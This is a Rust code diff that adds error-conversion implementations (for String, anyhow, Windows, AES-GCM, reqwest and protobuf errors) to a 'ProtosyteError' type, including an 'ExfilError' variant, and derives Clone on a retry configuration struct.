@@ -31,6 +31,56 @@ impl fmt::Display for ProtosyteError {
 
 impl std::error::Error for ProtosyteError {}
 
+// Conversion traits for easy error handling
+impl From<String> for ProtosyteError {
+    fn from(msg: String) -> Self {
+        ProtosyteError::SystemError(msg)
+    }
+}
+
+impl From<&str> for ProtosyteError {
+    fn from(msg: &str) -> Self {
+        ProtosyteError::SystemError(msg.to_string())
+    }
+}
+
+impl From<anyhow::Error> for ProtosyteError {
+    fn from(err: anyhow::Error) -> Self {
+        ProtosyteError::SystemError(err.to_string())
+    }
+}
+
+impl From<windows::core::Error> for ProtosyteError {
+    fn from(err: windows::core::Error) -> Self {
+        ProtosyteError::SystemError(format!("Windows error: {}", err))
+    }
+}
+
+impl From<aes_gcm::Error> for ProtosyteError {
+    fn from(err: aes_gcm::Error) -> Self {
+        ProtosyteError::CryptoError(format!("AES-GCM error: {:?}", err))
+    }
+}
+
+impl From<reqwest::Error> for ProtosyteError {
+    fn from(err: reqwest::Error) -> Self {
+        ProtosyteError::NetworkError(format!("HTTP error: {}", err))
+    }
+}
+
+impl From<prost::EncodeError> for ProtosyteError {
+    fn from(err: prost::EncodeError) -> Self {
+        ProtosyteError::ExfilError(format!("Protobuf encode error: {}", err))
+    }
+}
+
+impl From<prost::DecodeError> for ProtosyteError {
+    fn from(err: prost::DecodeError) -> Self {
+        ProtosyteError::ExfilError(format!("Protobuf decode error: {}", err))
+    }
+}
+
+#[derive(Clone)]
 pub struct RetryConfig {
     pub max_attempts: u32,
     pub initial_delay: Duration,
